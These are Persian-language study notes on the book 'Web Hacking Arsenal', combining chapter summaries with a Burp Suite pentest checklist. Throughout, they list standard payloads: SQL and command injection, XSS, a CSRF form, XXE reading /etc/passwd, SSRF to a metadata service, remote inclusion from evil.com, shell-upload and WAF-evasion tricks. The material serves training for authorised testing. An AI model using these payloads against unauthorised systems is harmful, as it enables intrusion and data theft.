مهم‌ترین مطالب و تکنیک‌ها

در هر فصل، چند نکته و تکنیک مهمی وجود داره که برای تست نفوذ روزمره خیلی به کارت میان:

فصل 2: جمع‌آوری اطلاعات (Intelligence Gathering & Enumeration)

انتخاب استراتژی مناسب برای جمع‌آوری آشکار و پنهان اطلاعات (passive / active)

پیدا کردن Subdomains، بررسی DNS، SSL/TLS، fingerprinting سرور، ورژن‌های نرم‌افزار

استفاده از ابزارها برای جمع-آوری ساختار صفحات، JavaScriptها، APIها، endpointها 
Google Books
+1

فصل 3: Server-Side Injection

انواع SQL Injection (Error-based, Blind, Union)

Command Injection، OS Injection

تزریقات بر روی پایگاه‌داده و نفوذ با پارامترهایی که ورودی‌هاشون مستقیما به DB میرن

فصل 4: Client-Side Injection

XSS (Reflected, Stored, DOM-based)

JS Injection، HTML Injection

آسیب‌پذیری‌هایی که در سمت کلاینت برای دستکاری DOM، سرقت کوکی/توکن یا فیشینگ ظاهر میشن

فصل 5: CSRF

چگونگی کارکرد CSRF و راهکارهای معمول محافظتی مثل توکن‌ها، SameSite، Referer Validation

bypass کردن محافظت‌های ضعیف و حملات ترکیبی با XSS

فصل 7: Authentication / Authorization / SSO

آزمون پارامترهای مربوط به لاگین، پسورد reset، session fixation

SSO و OAuth و OpenID گرفتن چکربازان برای اطمینان از این که اصلاً کسی بتونه توکن کاربری رو دستکاری کنه

Broken Access Control (مثل IDOR, horizontal privilege escalation) 
Google Books

فصل 8: Business Logic Flaws

منطق تجاری نادرست مثل bypass قوانین، فرایندهای خاصی که باید کنترل بشن (مثلاً محدودیت پرداخت، کوپن، فاکتور)

مثال‌هایی که باگ بانتی‌ها معمولاً بهش برخورد می‌کنن

فصل 9: XXE, SSRF, Request Smuggling

XXE: تزریق موجودیت خارجی و آسیب‌هایی که پرونده‌ها، داده‌های داخلی، سرویس‌ها رو تحت تأثیر قرار میدن

SSRF: چگونگی کشفش، بهره‌برداری از آدرس‌های داخلی، metadata service

Request Smuggling: چطور درخواست‌های HTTP مخلوط میشن و چگونه این باعث دور زدن محافظ‌ها یا کشف اطلاعات میشه

فصل 13: Evading Web Application Firewalls (WAFs)

تکنیک‌های دورزدن WAF مثل تغییر هدرها، encoding، chunked encoding، تغییر روش HTTP، استفاده از پارامترهای غیرعادی

چگونه payloadها رو طوری بسازی که فیلتر WAFها رو رد کنن

فصل 14: Report Writing

چطور یافته‌ها رو حرفه‌ای مستندسازی کنی

مفاهیم مانند عنوان مناسب، شرح آسیب‌پذیری، مراحل بازتولید، تاثیر، توصیه‌ها

اهمیت ارایه‌ی مدرک مثل Request / Response / اسکرین‌شات / PoC

✅ نکات کاربردی از کتاب برای عمل در باگ بانتی / تست نفوذ

همیشه با جمع‌آوری کامل اطلاعات شروع کن: endpointها، پارامترها، APIها، تکنولوژی استفاده‌شده

فراتر از Injectionها — باگ‌های منطقی (Business Logic) و کنترل دسترسی معمولاً پیچیده‌تر دیده می‌شن ولی ارزش بالایی دارن

برای SSRF و XXE تنوع payload داشته باش و تست‌های Out-of-Band (Collaborator) انجام بده

برای WAF: تست Encode کردن، تغییر روش حمله، استفاده از محتوای عجیب

مستندسازی کامل: برای P1، شواهد واضح فرستادن جواب غیرمجاز با درخواست تغییر داده شده، لاگ‌ها، تفاوت در پاسخ‌ها و غیره ضروریه


===============================================================================
===============================================================================

خلاصه فصل به فصل – Web Hacking Arsenal
فصل ۱: آشنایی با وب و مرورگر

معرفی پروتکل‌ها: HTTP/HTTPS

ساختار Request / Response

اهمیت Headerها: Host, Cookie, Authorization, User-Agent

نکته تست نفوذ: همیشه تغییر هدرها رو تست کن (مثلاً X-Forwarded-For: 127.0.0.1)

فصل ۲: جمع‌آوری اطلاعات (Intelligence Gathering)

شناسایی دامنه، Subdomainها، DNS، SSL

Enumerate endpointها از طریق:

```
Tools: gau, waybackurls, assetfinder, amass
```
پارامترهای رایج:

```
id, user_id, account, order, uid, pid, cid, file, doc, download
```

نمونه endpoint حساس:
```
/api/v1/users?id=123
/download?file=report.pdf
/orders/view/123
```

Payload تست LFI:
```
../../../../etc/passwd
```
فصل ۳: تزریق‌های سمت سرور (Server-Side Injection)

SQL Injection:
پارامترهای حساس: id, user, q, search, page

Payload:
```
' OR '1'='1 --
1' UNION SELECT null,version(),database() --
```

Command Injection:
```
Endpoint مشکوک: /ping?host=8.8.8.8
```
Payload:
```
8.8.8.8; cat /etc/passwd
&& whoami
```
فصل ۴: تزریق سمت کاربر (Client-Side Injection – XSS)

Reflected XSS:
```
/search?q=<script>alert(1)</script>
```

Stored XSS: در فرم‌های کامنت، پروفایل، پیام خصوصی

DOM XSS: در JS فایل‌ها (location.hash, document.write)

فصل ۵: CSRF (Cross-Site Request Forgery)

نمونه PoC:
```
<form action="https://target.com/change_email" method="POST">
  <input type="hidden" name="email" value="attacker@mail.com">
  <input type="submit">
</form>
```

تست روی Endpointهای حساس:
```
/change_password

/update_email

/transfer_money
```
فصل ۶: حملات فایل سیستم

تست LFI/RFI روی پارامترهای file, path, template:
```
file=../../../../etc/passwd
file=http://evil.com/shell.txt
```

Upload bypass: آپلود فایل با تغییر mime-type یا double extension:
```
shell.php;.jpg
```
فصل ۷: Authentication & Authorization

تست روی:
```
/login, /reset_password, /oauth, /sso
```
پارامترهای حساس:
```
token, reset, otp, session, sid, auth
```

مثال IDOR:
```
GET /api/v1/orders/123   → تغییر به 124
```
فصل ۸: باگ‌های منطق تجاری

تست محدودیت‌ها: تعداد دفعات درخواست OTP، اعمال کوپن تخفیف، محدودیت پرداخت

مثال:
```
/apply_coupon?code=DISCOUNT100
```

تست کن چند بار میشه استفاده کرد؟

فصل ۹: XXE / SSRF / Request Smuggling

XXE Payload:
```
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data>&xxe;</data>
```

SSRF Payload:
```
url=http://127.0.0.1:22
url=http://169.254.169.254/latest/meta-data/
```

Request Smuggling: تست روی هدرها:
```
Content-Length / Transfer-Encoding
```
فصل ۱۰: Attacking Serialization

تست روی پارامترهایی که base64 یا object serialization دارن (data=eyJ1c2VyIjogIjEyMyJ9)

ابزار: ysoserial, PHPGGC

فصل ۱۱: تست وب‌سرویس‌ها و Cloud

APIها:
```
/api/v1/users
/graphql
/swagger.json
```

تست Rate Limit و Broken Object Level Authorization (BOLA)

فصل ۱۲: حمله به HTML5
```
Storage Attacks: localStorage, sessionStorage
```
WebSocket Injection:
```
ws://target.com/chat
```

تست payload مشابه XSS یا SQL داخل پیام‌ها

فصل ۱۳: Evading WAF

تکنیک‌ها:

تغییر حروف: <ScRiPt>
```
استفاده از encoding: %3Cscript%3Ealert(1)%3C/script%3E

تغییر متد: POST → GET
```
فصل ۱۴: نوشتن گزارش (Report Writing)

ساختار: Title → Description → Steps to Reproduce → Impact → Recommendation → Evidence

تاکید روی وضوح و شواهد (Request/Response, PoC, Screenshot)

===============================================================================
===============================================================================

**# ✅ Web Hacking Arsenal – Burp Suite Checklist

## 1. Recon & Enumeration
- [ ] Passive recon: `gau`, `waybackurls`, `amass`, `assetfinder`
- [ ] Subdomain enumeration + TLS certs
- [ ] Check for open dirs: `/admin/`, `/backup/`, `/test/`
- [ ] Look for endpoints with params: `id, user_id, order, uid, pid, file, doc`

**Burp Actions:**
- Use **Logger++** to capture all traffic
- Spider / Crawl with Burp
- Highlight requests with params

---

## 2. Injection Attacks

### SQLi
- [ ] Test numeric params: `id=1' OR '1'='1`
- [ ] Error-based, Union, Blind payloads
- [ ] Burp Intruder → fuzz parameters

**Payloads:**
```
sql
' OR 1=1--
1' UNION SELECT null, version(), database()--
**
```

Command Injection
```
 Params like host, ip, cmd

 Try chaining with ;, &&, |

8.8.8.8; whoami
127.0.0.1 && cat /etc/passwd
```
3. Client-Side Injection
XSS
```
 Reflected: /search?q=<script>alert(1)</script>

 Stored: profile, comments, messages

 DOM: look at JS files for document.write, innerHTML
```
Payloads:
```
"><script>alert(1)</script>
<img src=x onerror=alert(1)>
```
4. CSRF
```
 Sensitive endpoints: /change_email, /reset_password, /transfer_money
```
 Test without CSRF token

 SameSite & Referer checks bypass?

PoC Template:
```
<form action="https://target.com/change_email" method="POST">
  <input type="hidden" name="email" value="attacker@mail.com">
  <input type="submit">
</form>
```
5. File System Attacks
LFI/RFI
```
 Params: file, path, template
```
```
../../../../etc/passwd
http://evil.com/shell.txt
```
File Upload
```
 Double extension: shell.php;.jpg
```
 MIME type tampering

6. Auth & Access Control
Broken Auth
```
 Test /login, /reset, /sso
```
 Reuse old tokens

 Session fixation

IDOR
```
 Change id=123 → 124

 Test on /orders/123, /api/v1/users/1
```
Burp Actions:

Use Autorize plugin with low-privilege token

Compare responses with high-priv account

7. Business Logic

 Multiple use of coupon codes

 Skipping payment steps

 Bypassing limits (OTP brute-force)

8. XXE / SSRF / Smuggling
XXE
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>&xxe;</root>
```
SSRF
```
url=http://127.0.0.1:22
url=http://169.254.169.254/latest/meta-data/
```
Request Smuggling

 Test Content-Length vs Transfer-Encoding

 Use Burp Smuggler extension

9. Serialization

 Look for Base64 / serialized objects

 Test with ysoserial payloads
```
 Example param: data=eyJ1c2VyIjogIjEyMyJ9
```
10. API & Cloud
```
 Enumerate /api/v1/*, /graphql, /swagger.json
```
 Test for BOLA (Broken Object Level Auth)

 Rate-limit bypass

11. HTML5 Features

 LocalStorage / SessionStorage data leakage

 WebSocket fuzzing with XSS/SQL payloads

12. WAF Evasion
```
 Encode payloads: %3Cscript%3Ealert(1)%3C/script%3E
```
 Change casing: <ScRiPt>
```
 Try different HTTP verbs: PUT, OPTIONS
```
13. Reporting
```
 Title (clear + vuln type)

 Description of vuln

 Steps to reproduce with Request/Response

 Impact (why it matters)

 Recommendation (fix guidance)

 Evidence (screenshots, PoC)
```
🎯 Pro Burp Suite Setup

Extensions to install:

```
Logger++ (monitor)

Autorize (access control testing)

ActiveScan++ (enhanced scanning)

Collaborator Everywhere (OOB detection)

Turbo Intruder (fast brute-force/fuzzing)

```

===============================================================================
===============================================================================

